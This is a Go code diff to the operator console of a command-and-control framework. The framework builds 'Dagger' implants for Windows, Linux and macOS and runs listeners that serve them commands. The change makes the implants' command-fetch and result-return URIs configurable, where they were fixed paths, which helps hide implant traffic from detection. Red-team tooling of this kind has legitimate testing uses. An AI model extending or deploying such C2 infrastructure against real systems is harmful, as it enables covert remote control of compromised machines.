@@ -183,7 +183,7 @@ func UUID_info_func(UUID string) (impInfoStruct, error) {
 
 }
 
-func EnableServers(address, port string) (string, error) {
+func EnableServers(address, port, GetURI, PostURI string) (string, error) {
 	//fmt.Printf("Will serve listener on address %s and port %s \n", address, port)
 
 	serverAddr := address + ":" + port
@@ -205,7 +205,7 @@ func EnableServers(address, port string) (string, error) {
 		os.Exit(1)
 	}
 
-	http.HandleFunc("/session", func(w http.ResponseWriter, r *http.Request) {
+	http.HandleFunc("/"+GetURI, func(w http.ResponseWriter, r *http.Request) {
 		// Session handles the implant requesting a command
 		// This will return information
 		// Need to use the UUID to get the command in the DB
@@ -223,7 +223,7 @@ func EnableServers(address, port string) (string, error) {
 
 	})
 
-	http.HandleFunc("/schema", func(w http.ResponseWriter, r *http.Request) {
+	http.HandleFunc("/"+PostURI, func(w http.ResponseWriter, r *http.Request) {
 		// schema handles implants returning information
 		// This will need to get information from the body of the request
 		// That info is then fed into the API
@@ -265,6 +265,7 @@ func StartGRPCServers(wg *sync.WaitGroup, stopCh chan struct{}) {
 
 	if err != nil {
 		fmt.Printf("failed connection: %v", err)
+		os.Exit(1)
 	}
 
 	s := grpc.NewServer()
@@ -289,10 +290,10 @@ func StartGRPCServers(wg *sync.WaitGroup, stopCh chan struct{}) {
 	<-stopCh
 }
 
-func startListener(address, port string) (string, error) {
+func startListener(address, port, GetURI, PostURI string) (string, error) {
 	fmt.Printf("Will attempt to serve on %s %s\n", address, port)
 
-	code, err := EnableServers(address, port)
+	code, err := EnableServers(address, port, GetURI, PostURI)
 	if err != nil {
 		return code, err
 	}
@@ -491,7 +492,7 @@ func UUID_info(UUID string) (impInfo, error) {
 
 }
 
-func build(platform, arch, name, listener, jitter string, sleep int32) (uint16, error) {
+func build(platform, arch, name, listener, jitter, GetURI, PostURI string, sleep int32) (uint16, error) {
 	fmt.Printf("Attempting to compile... \n")
 	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
 	if err != nil {
@@ -505,7 +506,8 @@ func build(platform, arch, name, listener, jitter string, sleep int32) (uint16, 
 	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
 
 	defer cancel()
-	res, err := c.StartBuilding(ctx, &pb.BuildRoutine{Platform: platform, Architecture: arch, Name: name, ListenerAddress: listener, Jitter: jitter, Sleep: sleep})
+	res, err := c.StartBuilding(ctx, &pb.BuildRoutine{Platform: platform, Architecture: arch, Name: name, ListenerAddress: listener,
+		Jitter: jitter, Sleep: sleep, GetURL: GetURI, PostURL: PostURI})
 
 	if err != nil {
 		return 1, err
@@ -552,7 +554,7 @@ func main() {
 				fmt.Printf("5 will let you start a listener on an address and port combo \n")
 				fmt.Printf("'help' will bring you to this menu \n")
 			case input == "1":
-				var platform, arch, name, listener, jitter string
+				var platform, arch, name, listener, jitter, GetURI, PostURI string
 				var sleep int32
 				fmt.Printf("Build menu \n")
 				fmt.Printf("This menu allows you to build a Dagger implant \n")
@@ -570,6 +572,16 @@ func main() {
 				fmt.Printf("%sSleep (In seconds) > %s", red, reset)
 				fmt.Scan(&sleep)
 
+				fmt.Printf("%sNow we need the URI to fetch commands from \n%s", blue, reset)
+				fmt.Printf("%sThis needs to match your listener configuration \n%s", blue, reset)
+				fmt.Printf("%sURI to GET command (This could be 'session' or anything)> %s", red, reset)
+				fmt.Scan(&GetURI)
+
+				fmt.Printf("%sFinally we need to enter in the URI to send results to \n%s", blue, reset)
+				fmt.Printf("%sThis needs to match your listener configuration \n%s", blue, reset)
+				fmt.Printf("%sURI to send results (This could be 'schema' or anything)> %s", red, reset)
+				fmt.Scan(&PostURI)
+
 				platform = strings.ToLower(platform)
 				arch = strings.ToLower(arch)
 				name = strings.ToLower(name)
@@ -577,7 +589,7 @@ func main() {
 				jitter = strings.ToLower(jitter)
 				switch platform {
 				case "windows", "linux", "darwin":
-					_, err := build(platform, arch, name, listener, jitter, sleep)
+					_, err := build(platform, arch, name, listener, jitter, GetURI, PostURI, sleep)
 					if err != nil {
 						fmt.Printf("error while building, %e", err)
 					}
@@ -713,7 +725,7 @@ func main() {
 
 				}
 			case input == "5":
-				var address, port string
+				var address, port, GetURI, PostURI string
 				fmt.Printf("Listeners \n")
 				fmt.Printf("Start a listener \n")
 				fmt.Println("Enter the listener address > ")
@@ -723,7 +735,17 @@ func main() {
 				}
 				fmt.Println("Enter the port to use > ")
 				fmt.Scan(&port)
-				code, err := startListener(address, port)
+
+				fmt.Printf("%sNow we need the URI to serve commands from \n%s", blue, reset)
+				fmt.Printf("%sThis needs to match your associated implant configuration \n%s", blue, reset)
+				fmt.Printf("%sURI to serve commands (This could be 'session' or anything)> %s", red, reset)
+				fmt.Scan(&GetURI)
+
+				fmt.Printf("%sFinally we need to enter in the URI to receive results to \n%s", blue, reset)
+				fmt.Printf("%sThis needs to match your associated implant configuration \n%s", blue, reset)
+				fmt.Printf("%sURI to send results (This could be 'schema' or anything)> %s", red, reset)
+				fmt.Scan(&PostURI)
+				code, err := startListener(address, port, GetURI, PostURI)
 				if err != nil {
 					fmt.Printf("Error: %e", err)
 				}
